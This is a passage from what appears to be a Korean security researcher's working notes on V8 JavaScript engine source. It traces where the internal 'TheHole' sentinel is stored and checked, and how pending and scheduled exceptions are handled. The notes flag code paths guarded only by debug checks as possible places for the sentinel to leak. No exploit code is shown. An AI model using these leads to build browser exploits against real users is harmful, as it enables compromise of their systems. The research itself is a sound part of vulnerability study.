    <span class="n">capacity</span><span class="o">:</span> <span class="n">intptr</span><span class="p">)</span><span class="o">:</span> <span class="n">FixedArray</span> <span class="p">{</span>
  <span class="c1">// TODO(turbofan): This should be optimized to use memcpy for initialization.</span>
  <span class="k">return</span> <span class="n">NewFixedArray</span><span class="p">(</span>
      <span class="n">capacity</span><span class="p">,</span>
      <span class="n">IteratorSequence</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span>
          <span class="p">(</span><span class="o">&amp;</span><span class="n">source</span><span class="p">.</span><span class="n">objects</span><span class="p">).</span><span class="n">Iterator</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="n">first</span> <span class="o">+</span> <span class="n">count</span><span class="p">),</span>
          <span class="n">ConstantIterator</span><span class="p">(</span><span class="n">TheHole</span><span class="p">)));</span>
<span class="err">}</span>
</code></pre></div></div>

<p>torque에서 NewFixedArray는 length와 iterator를 입력으로 받고 iterator가 주는 값들로 FixedArray의 elements 값들을 초기화함. 위 처럼 TheHole로 초기화 하는 경우가 있음. FixedArray의 element에 TheHole 값이 저장되는 것은 매우 자연스러운 일임.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">elements</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="nf">CopyPackedSmiToDoubleElements</span><span class="p">(</span><span class="n">FixedArrayBase</span> <span class="n">from_base</span><span class="p">,</span>
                                   <span class="kt">uint32_t</span> <span class="n">from_start</span><span class="p">,</span> <span class="n">FixedArrayBase</span> <span class="n">to_base</span><span class="p">,</span>
                                   <span class="kt">uint32_t</span> <span class="n">to_start</span><span class="p">,</span> <span class="kt">int</span> <span class="n">packed_size</span><span class="p">,</span>
                                   <span class="kt">int</span> <span class="n">raw_copy_size</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">...</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">from_end</span> <span class="o">=</span> <span class="n">from_start</span> <span class="o">+</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">packed_size</span><span class="p">);</span>
       <span class="n">from_start</span> <span class="o">&lt;</span> <span class="n">from_end</span><span class="p">;</span> <span class="n">from_start</span><span class="o">++</span><span class="p">,</span> <span class="n">to_start</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Object</span> <span class="n">smi</span> <span class="o">=</span> <span class="n">from</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">from_start</span><span class="p">);</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">smi</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">());</span>
    <span class="n">to</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="n">to_start</span><span class="p">,</span> <span class="n">Smi</span><span class="o">::</span><span class="n">ToInt</span><span class="p">(</span><span class="n">smi</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>packed 이므로 <code class="language-plaintext highlighter-rouge">DCHECK(!smi.IsTheHole());</code> 검증을 수행하는 것 같은데… TheHole 이면 무슨 문제가 있나? <a href="https://bugs.chromium.org/p/v8/issues/detail?id=7598&amp;q=hole&amp;can=1">Issue 7598: AllocateJSArray may expose the hole</a> 을 참고해보면 어떨런지? TheHole에 대해 <code class="language-plaintext highlighter-rouge">Smi::ToInt()</code>를 수행하는 것이 문제가 될런지. TODO</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">elements</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="nf">CopyDictionaryToObjectElements</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">FixedArrayBase</span> <span class="n">from_base</span><span class="p">,</span>
                                    <span class="kt">uint32_t</span> <span class="n">from_start</span><span class="p">,</span> <span class="n">FixedArrayBase</span> <span class="n">to_base</span><span class="p">,</span>
                                    <span class="n">ElementsKind</span> <span class="n">to_kind</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">to_start</span><span class="p">,</span>
                                    <span class="kt">int</span> <span class="n">raw_copy_size</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">...</span>
  <span class="n">WriteBarrierMode</span> <span class="n">write_barrier_mode</span> <span class="o">=</span> <span class="n">GetWriteBarrierMode</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">to_kind</span><span class="p">,</span> <span class="n">no_gc</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">copy_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">InternalIndex</span> <span class="n">entry</span> <span class="o">=</span> <span class="n">from</span><span class="p">.</span><span class="n">FindEntry</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="n">from_start</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">is_found</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">from</span><span class="p">.</span><span class="n">ValueAt</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span>
      <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">value</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">));</span>
      <span class="n">to</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">to_start</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">write_barrier_mode</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">to</span><span class="p">.</span><span class="n">set_the_hole</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="n">to_start</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>TheHole 여부를 확인하여(<code class="language-plaintext highlighter-rouge">entry.is_found()</code>) set을 구분하고 있는데 set 의 경우는 write barrier가 필요하고 set_the_hole은 NoWriteBarrierSet를 통해 수행되는 차이가 있으므로 이를 구분하기 위한 것으로 보인다.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">shared</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">info</span><span class="o">-</span><span class="n">inl</span><span class="p">.</span><span class="n">h</span>
<span class="kt">void</span> <span class="n">SharedFunctionInfo</span><span class="o">::</span><span class="n">set_outer_scope_info</span><span class="p">(</span><span class="n">HeapObject</span> <span class="n">value</span><span class="p">,</span>
                                              <span class="n">WriteBarrierMode</span> <span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">is_compiled</span><span class="p">());</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">raw_outer_scope_info_or_feedback_metadata</span><span class="p">().</span><span class="n">IsTheHole</span><span class="p">());</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">IsScopeInfo</span><span class="p">()</span> <span class="o">||</span> <span class="n">value</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">());</span>
  <span class="n">set_raw_outer_scope_info_or_feedback_metadata</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">shared</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">info</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="n">SharedFunctionInfo</span><span class="o">::</span><span class="n">DiscardCompiledMetadata</span><span class="p">(</span>
            <span class="p">...</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="n">outer_scope_info</span><span class="p">().</span><span class="n">IsScopeInfo</span><span class="p">()</span> <span class="o">||</span> <span class="n">outer_scope_info</span><span class="p">().</span><span class="n">IsTheHole</span><span class="p">());</span>
            <span class="p">...</span>
</code></pre></div></div>

<p>SFI(SharedFunctionInfo), scope_info에도 TheHole이 저장될 수 있는 듯. 이것이 leak이 될 수가 있나…? 없을거같은데. 아마 top-level 일 때 TheHole 일 것 같은데.</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">runtime</span><span class="o">-</span><span class="n">classes</span><span class="p">.</span><span class="n">cc</span>
<span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">DefineClass</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                <span class="n">Handle</span><span class="o">&lt;</span><span class="n">ClassBoilerplate</span><span class="o">&gt;</span> <span class="n">class_boilerplate</span><span class="p">,</span>
                                <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">super_class</span><span class="p">,</span>
                                <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">constructor</span><span class="p">,</span>
                                <span class="n">RuntimeArguments</span><span class="o">&amp;</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">prototype_parent</span><span class="p">;</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span> <span class="n">constructor_parent</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">super_class</span><span class="o">-&gt;</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">prototype_parent</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">initial_object_prototype</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="p">...</span>
</code></pre></div></div>

<p>class의 super class 등을 나타낼 때에 TheHoleㅣ 쓰이는 듯?</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">runtime</span><span class="o">-</span><span class="n">scopes</span><span class="p">.</span><span class="n">cc</span>
<span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">LoadLookupSlot</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span>
                                   <span class="n">ShouldThrow</span> <span class="n">should_throw</span><span class="p">,</span>
                                   <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;*</span> <span class="n">receiver_return</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">!=</span> <span class="n">Context</span><span class="o">::</span><span class="n">kNotFound</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="n">holder</span><span class="o">-&gt;</span><span class="n">IsContext</span><span class="p">());</span>
    <span class="c1">// If the "property" we were looking for is a local variable, the</span>
    <span class="c1">// receiver is the global object; see ECMA-262, 3rd., 10.1.6 and 10.2.3.</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">undefined_value</span><span class="p">();</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span> <span class="o">=</span> <span class="n">handle</span><span class="p">(</span><span class="n">Context</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="o">*</span><span class="n">holder</span><span class="p">).</span><span class="n">get</span><span class="p">(</span><span class="n">index</span><span class="p">),</span> <span class="n">isolate</span><span class="p">);</span>
    <span class="c1">// Check for uninitialized bindings.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="n">kNeedsInitialization</span> <span class="o">&amp;&amp;</span> <span class="n">value</span><span class="o">-&gt;</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">THROW_NEW_ERROR</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span>
                      <span class="n">NewReferenceError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kNotDefined</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span>
                      <span class="n">Object</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">receiver_return</span><span class="p">)</span> <span class="o">*</span><span class="n">receiver_return</span> <span class="o">=</span> <span class="n">receiver</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="p">...</span>
</code></pre></div></div>

<p>flag != kNeedsInitialization 이면서 value가 TheHole인 경우를 찾아보면 어떨까? LoadLookupSlot은 Runtime 함수에서 호출하며 해당 Runtime 함수들은 interpreter, compiler, src/ic/accessor-assembler.cc 등에서 호출됨(Runtime::kLoadLookupSlot[…] 으로 검색)</p>

<p>추측: 여기서 Lookup이라 함은 property를 찾는 것을 의미하는 것이 아닐까. Initialization이 필요한 경우(kNeedsInitialization)에만 TheHole 값을 갖나본데. kNeedsInitialization을 피하면서 TheHole을 갖게 하면 TheHole이 leak 될 것 같기도? (물론 현재는 분석하기 전이므로 소설임) TODO</p>

<p>StoreLookupSlot 도 참고</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="o">/</span><span class="n">cctest</span><span class="o">/</span><span class="n">test</span><span class="o">-</span><span class="n">dictionary</span><span class="p">.</span><span class="n">cc</span>
<span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">HashMap</span><span class="p">&gt;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">TestHashMapDoesNotCauseGC</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">HashMap</span><span class="o">&gt;</span> <span class="n">table</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="c1">// Calling Lookup() should not cause GC ever.</span>
  <span class="n">CHECK</span><span class="p">(</span><span class="n">table</span><span class="o">-&gt;</span><span class="n">Lookup</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">));</span>
                    <span class="p">...</span>
</code></pre></div></div>

<p>위의 Lookup은 ObjectHashTableBase의 Lookup임(<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.cc;drc=42e75824670baadf21ece40f71b946500af1cbce;l=6335">ref</a>). 이처럼 hash table로부터 lookup 수행 결과에 대해서 TheHole 여부를 체크해야 하는데, 체크하지 않는 곳이 있을런지? TODO</p>

<hr />

<h2 id="the_hole-keyward-search">“the_hole” Keyward Search</h2>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">api</span><span class="o">-</span><span class="n">arguments</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span>
  <span class="mi">27</span>    <span class="c1">// It cannot escape into js as it's removed in Call below.</span>
  <span class="mi">28</span><span class="o">:</span>   <span class="n">HeapObject</span> <span class="n">the_hole</span> <span class="o">=</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="n">the_hole_value</span><span class="p">();</span>
  <span class="mi">29</span><span class="o">:</span>   <span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kReturnValueDefaultValueIndex</span><span class="p">).</span><span class="n">store</span><span class="p">(</span><span class="n">the_hole</span><span class="p">);</span>
  <span class="mi">30</span><span class="o">:</span>   <span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kReturnValueIndex</span><span class="p">).</span><span class="n">store</span><span class="p">(</span><span class="n">the_hole</span><span class="p">);</span>
  <span class="mi">31</span>    <span class="nf">DCHECK</span><span class="p">((</span><span class="o">*</span><span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kHolderIndex</span><span class="p">)).</span><span class="n">IsHeapObject</span><span class="p">());</span>

  <span class="mi">45</span>    <span class="c1">// It cannot escape into js as it's remove in Call below.</span>
  <span class="mi">46</span><span class="o">:</span>   <span class="n">HeapObject</span> <span class="n">the_hole</span> <span class="o">=</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="n">the_hole_value</span><span class="p">();</span>
  <span class="mi">47</span><span class="o">:</span>   <span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kReturnValueDefaultValueIndex</span><span class="p">).</span><span class="n">store</span><span class="p">(</span><span class="n">the_hole</span><span class="p">);</span>
  <span class="mi">48</span><span class="o">:</span>   <span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kReturnValueIndex</span><span class="p">).</span><span class="n">store</span><span class="p">(</span><span class="n">the_hole</span><span class="p">);</span>
  <span class="mi">49</span>    <span class="nf">DCHECK</span><span class="p">((</span><span class="o">*</span><span class="n">slot_at</span><span class="p">(</span><span class="n">T</span><span class="o">::</span><span class="n">kHolderIndex</span><span class="p">)).</span><span class="n">IsHeapObject</span><span class="p">());</span>
</code></pre></div></div>

<p>PropertyCallbackArguments, FunctionCallbackArguments. api 쪽. TODO</p>

<hr />

<p>ㅁㄴㅇㄹ</p>

<hr />

<h2 id="pending_exception-scheduled_exception">pending_exception, scheduled_exception</h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="o">-</span><span class="n">inl</span><span class="p">.</span><span class="n">h</span>

<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">pending_exception</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">CHECK</span><span class="p">(</span><span class="n">has_pending_exception</span><span class="p">());</span>       <span class="c1">// &lt;--- changed from DCHECK to CHECK</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">pending_exception_</span><span class="p">.</span><span class="n">IsException</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="k">return</span> <span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">pending_exception_</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">clear_pending_exception</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">pending_exception_</span><span class="p">.</span><span class="n">IsException</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">pending_exception_</span> <span class="o">=</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="n">the_hole_value</span><span class="p">();</span>
<span class="p">}</span>

<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">scheduled_exception</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">has_scheduled_exception</span><span class="p">());</span>    <span class="c1">// &lt;--- 얘는 아직 DCHECK 임 </span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">scheduled_exception_</span><span class="p">.</span><span class="n">IsException</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="k">return</span> <span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">scheduled_exception_</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">clear_scheduled_exception</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">thread_local_top</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">scheduled_exception_</span><span class="p">.</span><span class="n">IsException</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="n">set_scheduled_exception</span><span class="p">(</span><span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="n">the_hole_value</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>38003과 관련된 것. pending_exception이 CHECK로 패치되었다. scheduled_exception은 아직 DCHECK 인데… 얘도 결국 나중에 pending_exception 자리를 거친다면 결국 CHECK에서 걸린다는 건데…</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">h</span>
  <span class="c1">// Promote a scheduled exception to pending. Asserts has_scheduled_exception.</span>
  <span class="n">Object</span> <span class="nf">PromoteScheduledException</span><span class="p">();</span>
</code></pre></div></div>

<p>위는 이러한 생각을 뒷받침해주는 코드 일부(주석)</p>

<h3 id="exception-처리-과정-분석">exception 처리 과정 분석</h3>

<p>38003 이슈 페이지에서 언급되어있듯이 builtins-x64.cc(혹은 builtins-arm64.cc 등)에서 exception sentinel 값(RootIndex::kException)과 비교하여 익셉션 발생 여부 확인. 이후 <code class="language-plaintext highlighter-rouge">ExternalReference find_handler = ExternalReference::Create(Runtime::kUnwindAndFindExceptionHandler);</code>  구문을 통해 런타임 함수 UnwindAndFindExceptionHandler를 호출.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">runtime</span><span class="o">-</span><span class="n">internal</span><span class="p">.</span><span class="n">cc</span>
<span class="nf">RUNTIME_FUNCTION</span><span class="p">(</span><span class="n">Runtime_UnwindAndFindExceptionHandler</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">SealHandleScope</span> <span class="n">shs</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">length</span><span class="p">());</span>
  <span class="k">return</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">UnwindAndFindHandler</span><span class="p">();</span>
<span class="p">}</span>

<span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">UnwindAndFindHandler</span><span class="p">()</span> <span class="p">{</span>
					<span class="p">...</span>
  <span class="n">Object</span> <span class="n">exception</span> <span class="o">=</span> <span class="n">pending_exception</span><span class="p">();</span>
  					<span class="p">...</span>
    <span class="n">clear_pending_exception</span><span class="p">();</span>
    <span class="k">return</span> <span class="n">exception</span><span class="p">;</span>
  <span class="p">};</span>
					<span class="p">...</span>
</code></pre></div></div>

<p>결국 pending_exception()을 통해 익셉션을 획득함.</p>

<h3 id="promotescheduledexception">PromoteScheduledException()</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">PromoteScheduledException</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">Object</span> <span class="n">thrown</span> <span class="o">=</span> <span class="n">scheduled_exception</span><span class="p">();</span>
  <span class="n">clear_scheduled_exception</span><span class="p">();</span>
  <span class="c1">// Re-throw the exception to avoid getting repeated error reporting.</span>
  <span class="k">return</span> <span class="n">ReThrow</span><span class="p">(</span><span class="n">thrown</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">ReThrow</span><span class="p">(</span><span class="n">Object</span> <span class="n">exception</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">has_pending_exception</span><span class="p">());</span>

  <span class="c1">// Set the exception being re-thrown.</span>
  <span class="n">set_pending_exception</span><span class="p">(</span><span class="n">exception</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">heap</span><span class="p">()).</span><span class="n">exception</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>ReThrow 에서 set_pending_exception 후에 pending_exception()을 리턴하는 것이 아닌 <code class="language-plaintext highlighter-rouge">ReadOnlyRoots(heap()).exception();</code>를 리턴하는데, <del>그러면 pending_exception() 내에서 설정된 CHECK 를 안거치는 것 아닌가?</del> 결국 machinery 코드에서 UnwindAndFindHandler를 통해 pending_exception()이 호출되어 결국 걸리는 듯…</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">h</span>

<span class="cp">#define RETURN_FAILURE_IF_SCHEDULED_EXCEPTION(isolate) \
  do {                                                 \
    Isolate* __isolate__ = (isolate);                  \
    DCHECK(!__isolate__-&gt;has_pending_exception());     \
    if (__isolate__-&gt;has_scheduled_exception()) {      \
      return __isolate__-&gt;PromoteScheduledException(); \
    }                                                  \
  } while (false)
</span>
<span class="c1">// Macros for MaybeHandle.</span>

<span class="cp">#define RETURN_VALUE_IF_SCHEDULED_EXCEPTION(isolate, value) \
  do {                                                      \
    Isolate* __isolate__ = (isolate);                       \
    DCHECK(!__isolate__-&gt;has_pending_exception());          \
    if (__isolate__-&gt;has_scheduled_exception()) {           \
      __isolate__-&gt;PromoteScheduledException();             \
      return value;                                         \
    }                                                       \
  } while (false)
</span>
<span class="cp">#define RETURN_EXCEPTION_IF_SCHEDULED_EXCEPTION(isolate, T) \
  RETURN_VALUE_IF_SCHEDULED_EXCEPTION(isolate, MaybeHandle&lt;T&gt;())
</span>
<span class="cp">#define ASSIGN_RETURN_ON_SCHEDULED_EXCEPTION_VALUE(isolate, dst, call, value) \
  do {                                                                        \
    Isolate* __isolate__ = (isolate);                                         \
    if (!(call).ToLocal(&amp;dst)) {                                              \
      DCHECK(__isolate__-&gt;has_scheduled_exception());                         \
      __isolate__-&gt;PromoteScheduledException();                               \
      return value;                                                           \
    }                                                                         \
  } while (false)
</span>
<span class="cp">#define RETURN_ON_SCHEDULED_EXCEPTION_VALUE(isolate, call, value) \
  do {                                                            \
    Isolate* __isolate__ = (isolate);                             \
    if ((call).IsNothing()) {                                     \
      DCHECK(__isolate__-&gt;has_scheduled_exception());             \
      __isolate__-&gt;PromoteScheduledException();                   \
      return value;                                               \
    }                                                             \
  } while (false)
</span></code></pre></div></div>

<p>~~위처럼 RETURN_어쩌구… 매크로에서도 has_scheduled_exception() 으로 이미 검증 수행 후 PromoteScheduledException()을 수행함. ~~</p>

<p>ASSIGN_RETURN_ON_SCHEDULED_EXCEPTION_VALUE, RETURN_ON_SCHEDULED_EXCEPTION_VALUE 의 경우는 DCHECK로만 수행함. 더 살펴볼 필요 있음. TODO</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">source</span><span class="o">-</span><span class="n">text</span><span class="o">-</span><span class="n">module</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">bool</span> <span class="n">SourceTextModule</span><span class="o">::</span><span class="n">PrepareInstantiate</span><span class="p">(</span>
    <span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">SourceTextModule</span><span class="o">&gt;</span> <span class="n">module</span><span class="p">,</span>
